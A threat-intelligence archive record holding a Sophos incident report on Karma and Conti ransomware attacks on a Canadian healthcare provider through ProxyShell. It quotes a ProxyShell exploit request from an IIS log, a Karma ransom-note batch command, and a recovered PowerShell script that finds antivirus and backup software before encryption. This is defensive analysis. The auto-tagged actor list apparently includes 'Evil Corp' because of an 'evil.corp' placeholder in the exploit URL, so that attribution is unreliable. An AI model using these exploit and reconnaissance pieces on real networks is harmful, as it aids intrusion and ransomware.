{
    "id": "465a09fc-121c-4a1e-8bda-1f7124f2994d",
    "created_at": "2023-01-12T15:05:00.084772Z",
    "updated_at": "2025-03-27T02:13:29.073689Z",
    "deleted_at": null,
    "sha1_hash": "bd48345bc25363eb0f108035c6bc5225eeb4dbac",
    "title": "2022-02-28 - Conti and Karma actors attack healthcare provider at same time through ProxyShell exploits",
    "authors": "",
    "file_creation_date": "2022-05-28T01:23:14Z",
    "file_modification_date": "2022-05-28T01:23:14Z",
    "file_size": 1404202,
    "plain_text": "# Conti and Karma actors attack healthcare provider at same time through ProxyShell exploits\n\n**news.sophos.com/en-us/2022/02/28/conti-and-karma-actors-attack-healthcare-provider-at-same-time-through-**\nproxyshell-exploits/\n\nSean Gallagher February 28, 2022\n\nIn early December, a healthcare provider in Canada was hit by two separate ransomware\nactors with very different tactics. The first ransomware group, identified as Karma, exfiltrated\ndata but did not encrypt the target’s systems—because the targeted organization was in\nhealthcare, they claimed in the ransom note dropped on the target’s PCs.\n\nThe second group, identified as Conti, came onto the network later, but had no such\nreservations. Less than a day after the Karma gang dropped their ransom notes, the Conti\nactors deployed their ransomware. Sophos’ Rapid Response team had just begun talking\nwith the targeted company hours earlier, and the customer had not yet deployed Sophos’\nsoftware to the portion of the network where ransomware had been staged by the Conti\ngang. Existing (non-Sophos) anti-malware measures did not impede the attack.\n\n\n-----\n\nWe have several cases of ransomware affiliates using ProxyShell to penetrate victims\n[networks recently, including affiliates of Conti. And we have seen past examples of multiple](https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/)\nactors exploiting the same vulnerability to gain access to a victim. But, very few of those\ncases have involved two simultaneous ransomware groups.\n\n## Setting up shop\n\nBoth attackers gained entry via “ProxyShell” exploits (targeting CVE-2021-34473, CVE-202134523, and CVE-2021-31207 on Microsoft’s Exchange Server platform). The first intrusion\nusing the exploit was on August 10, 2021, as recorded in the IIS access log:\n```\nGET /autodiscover/autodiscover.json @evil.corp/owa/?\n&Email=autodiscover/autodiscover.json%3F@evil.corp&CorrelationID=\n<empty>;&cafeReqId=7f233041-e437-4b6a-b852-21c9b688f53c; 443 - 74.222.5.43\nMozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_10_1)+AppleWebKit/537.36+\n(KHTML,+like+Gecko)+Chrome/41.0.2227.1+Safari/537.36 - 302 0 0 122\"\n\n```\nThe commands that followed exploited the Exchange Management shell to create an\nadministrative account, “Administrator” and retrieve scripts from three remote servers—one\nin Hong Kong, another in Iran, and the last in Russia.\n\n\n-----\n\nPrior to the attack, the compromised organization was utilizing Sophos On-premises Antivirus. Being reliant on signature-based detection, this was inadequate for detection of the\nProxyShell exploit because ProxyShell uses web communications to exploit a trusted\napplication and does not deploy malware.\n\nThe “Administrator” account would later be used by one of the actors for lateral movement.\nWhile it cannot be confirmed from the available data, this first exploit was likely made by an\naccess broker who later sold access to one (or both) of the ransomware operators.\n\nAt this point, the customer reached out to Sophos support for assistance to load a product on\nto their Exchange servers. While the customer had noticed email being sent automatically\nfrom some users, the focus was on installing the third-party product and the intrusion was not\ndiscovered at this time.\n\nA second set of intrusions using the ProxyShell exploit chain occurred on November 11. This\nattack installed a web shell on the Exchange Server’s IIS web server instance. After these\nintrusions, while continuing to assist the customer with the third-party product on their\nExchange Servers, Sophos’ support recognized there may be indications of compromise and\nescalated the case for response assistance.\n\nActual efforts to more deeply penetrate the network began in earnest weeks later. Between\nNovember 29 and 30, system logs showed over 20 failed attempts and efforts to connect to\nother servers (including a domain controller), as well as a successful connection by the\naccount “Administrator” to another web application server from the mail server. At some point\non November 30, the Administrator account was used to access an RDP session on a virtual\nmachine or workstation, which was used to make the login attempts. This activity appears to\nbe connected to the Karma gang.\n\nMeanwhile, another compromised account made a series of Remote Desktop Protocol\nconnections to other servers from a different compromised endpoint, and executed\nPowerShell commands downloading Cobalt Strike beacons from the same host used for\nscripts on November 30.\n\nOn November 30, after a few attempts on other systems, the attacker using Administrator\naccount successfully connected to another system (104[.]168.44.130), launching batch\nscripts that installed Cobalt Strike “beacons” as a service. Cobalt Strike was deployed to\nemail servers, domain controllers, and a few other systems, with more being targeted the\nnext day.\n\nCollection began as well on December 1, with the creation of .RAR archives of data on\nmultiple systems.\n\n## Things get messy\n\n\n-----\n\nOn December 1 and 2, the Karma gang finished gathering data and pushed it up to the Mega\ncloud storage service—exfiltrating 52 gigabytes of archived files. Then the Karma malware\nwas deployed, using the compromised Administrator account.\n\nThe malware distributed the ransom note through a service created on each targeted\nsystem, which copied the note from its original location and launched a batch file—for\nexample:\n```\n%COMSPEC% /C echo del C:\\KARMA_RANSOMWARE_README!!!.txt ^>\n%SYSTEMDRIVE%\\WINDOWS\\Temp\\QWvVYzfhbjXaDiRa.txt > \\WINDOWS\\Temp\\UIoTiUDorGDZImRd.bat\n& %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\UIoTiUDorGDZImRd.bat\n\n```\nComing into work on December 3, employees of the targeted organization found the Karma\nransom note as wallpaper on about 20 workstations and servers. The ransom note claimed\nthat data had only been exfiltrated and not encrypted because the Karma gang had identified\nthe target as a healthcare organization.\n\nAt that time, the organization called in Sophos Rapid Response team, and a kickoff\nteleconference was held early on December 3, and monitoring tools were put in place to\nbegin to understand what had happened. But within a few hours of the beginning of the\nRapid Response engagement, the second ransomware group launched its attack.\n\n\n-----\n\nTwo compromised accounts were active on December 3—the Administrator account and a\nsecond account with administrative privileges. One of these accounts installed the Chrome\nbrowser on the primary file server.\n\nThen, by way of the compromised Administrator account, malware was deployed to one of\nthe organization’s servers. The sample, 64.dll, was identified by SophosLabs as Conti. It\nwas loaded using regsvr.exe. As part of its execution, a batch file, def.bat, was launched,\ncontaining commands to disable Windows Defender on the targeted server.\n\nThis took place even as Karma was dropping ransom notes on additional systems.\nMeanwhile, the targeted organization’s network defenses detected and blocked Cobalt Strike\nactivity coming from one of the organization’s mail servers (not the one serving as point of\nentry). The detected Cobalt Strike C2 communications were to a server in a Netherlands\ndatacenter operated by a Bulgarian hosting company. The second compromised account\nwas used to download Cobalt Strike beacons to additional systems across the network.\n\nShortly after that, the second compromised account was used to drop a script into a local\nfolder on a domain server, That PowerShell script, named Get-DataInfo.ps1, gathered\nnetwork data via Windows Management Instrumentation queries and sent it back to a remote\ncommand and control server. Part of the script was recovered from system logs; it searches\nfor software of interest on computers on the network, including anti-malware and backup\nsoftware, as well as other software that might interfere with encryption by ransomware.\n\n\n-----\n\n```\nfunction Get Software{\n<#Variables#>\n$av_list = @(\"Traps\", \"threat\", \"Sentinel\", \"Defence\", \"Defender\", \"Endpoint\", \"AV\",\n\"AntiVirus\", \"BitDefender\", \"Kaspersky\", \"Norton\", \"Avast\", \"WebRoo\", \"AVG\", \"ESET\",\n\"Malware\", \"Defender\", \"Sophos\", \"Trend\", \"Symantec Endpoint Protection\", \"Security\")\n$backup_list = @(\"Veeam\", \"Backup\", \"Recovery\", \"Synology\", \"C2\", \"Cloud\", \"Dropbox\",\n\"Acronis\", \"Cobian\", \"EaseUS\", \"Paragon\", \"IDrive\" )\n$exclude_list = @(\"KONICA\", \"UltraVnc\", \"Update\", \"Hitachi Storage Navigator\nModular\", \".NET\", \"Office\", \"Adobe\", \"Word\", \"Excel\", \"Outlook\", \"PowerPoint\",\n\"Publisher\", \"Java\", \"Office\", \"Learning\", \"Support\", \"done\")\n$computername = Get-Content \".\\result\\livePCs.txt\" -ReadCount 0 \n$ErrorActionPreference = \"Stop\"\n$Branch = \"LocalMachine\"\n$SubBranch = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\"\n$SubBranch64 = \"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\"\n$tabName = \"SampleTable\"\n$table = New-Object system.Data.DataTable $table_name\n$col1 = New-Object system.Data.DataColumn SystemName,([string])\n$col2 = New-Object system.Data.DataColumn Type,([string])\n$col3 = New-Object system.Data.DataColumn Name,([string])\n$col4 = New-Object system.Data.DataColumn Hide,([string])\n$table.columns.add($col1)\n$table.columns.add($col2)\n$table.columns.add($col3)\n$table.columns.add($col4)\n$computers = $computername.Length\n$x = 0\nwrite-host -foregroundcolor cyan \"Grubbing Software.info\"\nwrite-host -foregroundcolor cyan \"Testing $computers computers, this may take a\nwhile.\"\nforeach ($computer in $computername) \n{\nif (Test-Connection -ComputerName $computer -Quiet -count 2 -BufferSize 4 -Delay 1){\n    Try{\n      $registry=\n[microsoft.win32.registrykey]::OpenRemoteBaseKey($Branch,$computer)\n$registrykey=$registry.OpenSubKey($Subbranch)\n      $SubKeys=$registrykey.GetSubKeyNames()\n      Foreach ($key in $subkeys){\n                    $exactkey=$key \n                    $NewSubKey=$SubBranch+\"\\\\\"+$exactkey \n $ReadUninstall=$registry.OpenSubKey($NewSubKey) \n                    $Value=$ReadUninstall.GetValue(\"DisplayName\") \n foreach($exclude in $exclude_list){\n if($Value -notmatch $exclude){\n foreach ($ Av in $ av_list) {\n if ($ Value -match $ Av) {\n $row = $table.NewRow()\n $row.SystemName = $computer\n $row.Type = \"AV\"\n $row.Name = $Value\n $table.Rows.Add($row)\n }}\n foreach($backup in $backup_list){\n\n```\n\n-----\n\n```\n if($Value match $backup){\n $row = $table.NewRow()\n $row.SystemName = $computer\n $row.Type = \"Backup\"\n $row.Name = $Value\n #$row.Hide = '=IF(AND(A2=A1, B2=B1),\"hide\",\"show\")'\n $table.Rows.Add($row)\n }}\n       }}}}Catch{Add-Content \"$registry\" -path .\\result\\error.txt}\n     Try{\n      $registry=\n[microsoft.win32.registrykey]::OpenRemoteBaseKey($Branch,$computer)\n      $registrykey=$registry.OpenSubKey($Subbranch64)\n      $SubKeys=$registrykey.GetSubKeyNames()\n      Foreach ($key in $subkeys){\n                    $exactkey=$key \n                    $NewSubKey=$SubBranch+\"\\\\\"+$exactkey \n $ReadUninstall=$registry.OpenSubKey($NewSubKey) \n                    $Value=$ReadUninstall.GetValue(\"DisplayName\") \n foreach($exclude in $exclude_list){\n if($Value -notmatch $exclude){ \n foreach ($ Av in $ av_list) {\n if ($ Value -match $ Av) {\n $row = $table.NewRow()\n $row.SystemName = $computer\n $row.Type = \"AV\"\n $row.Name = $Value\n $table.Rows.Add($row)\n }}\n foreach($backup in $backup_list){\n if($Value -match $backup){\n $row = $table.NewRow()\n $row.SystemName = $computer\n $row.Type = \"Backup\"\n $row.Name = $Value\n #$row.Hide = '=IF(AND(A2=A1, B2=B1),\"hide\",\"show\")'\n $table.Rows.Add($row)\n }}\n }}}\n}Catch{Add-Content \"$registry\" -path .\\result\\error.txt}\n$testcomputer_progress = [int][Math]::Ceiling((($x / $computers) * 100))\n# Progress bar\nWrite-Progress \"Grubbing Software.info\" -PercentComplete $testcomputer_progress Status \"Percent Complete - $testcomputer_progress%\" -Id 1;\nSleep(1);\n$x++; \n}}\nwrite-host -foregroundcolor cyan \"Grubbing Software.info complete\"\n$tabCsv = $table | export-csv .\\result\\Software.csv -noType }\n\n```\nThe script [has been in previous activity associated with the Bazar backdoor and with Ryuk](https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/)\nransomware. (The file itself was not recovered.)\n\n\n-----\n\nLate on December 3, more data (10.7 gigabytes worth) was exfiltrated to Mega using the\nChrome browser dropped on the file server earlier in the day; this appears to be the Conti\ngroup’s exfiltration. Moments later, the Conti ransomware attack began in earnest, with the\ndef.bat file deployed to suppress Windows Defender detection. The ransomware encrypted\nfiles on the C: drive of affected systems and dropped the Conti ransom note.\n\n## Aftermath\n\nThese dual ransom attacks highlight the risks associated with well-known Internet-facing\nsoftware vulnerabilities—at least, ones that are well-known to malicious actors but may not\nbe to the organizations running the affected software. All sizes of organizations can fall\nbehind on vulnerability management—which is why having multiple layers of defense against\nmalicious activity is important. Malware protection on servers as well as clients can impede\nransomware operators from using unprotected servers to launch their attacks.\n\nIn this case, the initial access came over 3 months before there was any ransomware\nactivity. This suggests the likelihood of an “access broker” discovering the ProxyShell\nvulnerability and either offering it for sale on a marketplace or simply sitting on it until\nransomware affiliates wanted it.\n\nDespite network monitoring and some malware defenses, both attackers in this case were\nable to largely accomplish their tactical goals. Only a few systems had Sophos malware\nprotection at the time of the Conti attack, as the targeted organization had not yet had time to\ndeploy it. In the few cases where Sophos had been deployed, ransomware protection\ndetected Conti launching, but the ransomware was largely run from servers without\nprotection.\n\nAs a result, much of the organization’s data was encrypted—as were the Karma ransom\nnotes. (Sophos detects Karma and Conti ransomware, by behavior and signature; in this\ncase Conti was detected as Troj/Conti-C and Troj/Ransom-GLU, and blocked by\nCryptoGuard on protected systems; the Bazar script was detected by behavior as\nMem/bazarld-c, Mem/bazarld-d and Mem/conti-b.)\n\nA full list of IOCs for this attack is [posted on SophosLabs’ GitHub page.](https://github.com/sophoslabs/IoCs/blob/master/Karma_Conti_joint_IOCs.csv)\n\n**SophosLabs would like to acknowledge the contributions of Mauricio Valdivieso,**\n**Linda Smith, Melissa Kelly, Johnathan Fern and Matthew Everts of Sophos’ Rapid**\n**Response team, and Rahul Dugar and Heli Sheth of SophosLabs to this report.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-28 - Conti and Karma actors attack healthcare provider at same time through ProxyShell exploits.pdf"
    ],
    "report_names": [
        "2022-02-28 - Conti and Karma actors attack healthcare provider at same time through ProxyShell exploits.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20c759c2-cd02-45bb-85c6-41bde9e6a7cf",
            "created_at": "2024-01-18T02:02:34.189827Z",
            "updated_at": "2025-03-27T02:02:09.937024Z",
            "deleted_at": null,
            "main_name": "HomeLand Justice",
            "aliases": [
                "Karma",
                "Storm-842",
                "Void Manticore"
            ],
            "source_name": "ETDA:HomeLand Justice",
            "tools": [
                "BABYWIPER",
                "BiBi Wiper",
                "BiBi-Linux Wiper",
                "BiBi-Windows Wiper",
                "Cl Wiper",
                "LowEraser",
                "No-Justice Wiper",
                "Plink",
                "PuTTY Link",
                "RevSocks",
                "W2K Res Kit"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535900,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1653700994,
    "ts_modification_date": 1653700994,
    "files": {
        "pdf": "https://archive.orkl.eu/bd48345bc25363eb0f108035c6bc5225eeb4dbac.pdf",
        "text": "https://archive.orkl.eu/bd48345bc25363eb0f108035c6bc5225eeb4dbac.txt",
        "img": "https://archive.orkl.eu/bd48345bc25363eb0f108035c6bc5225eeb4dbac.jpg"
    }
}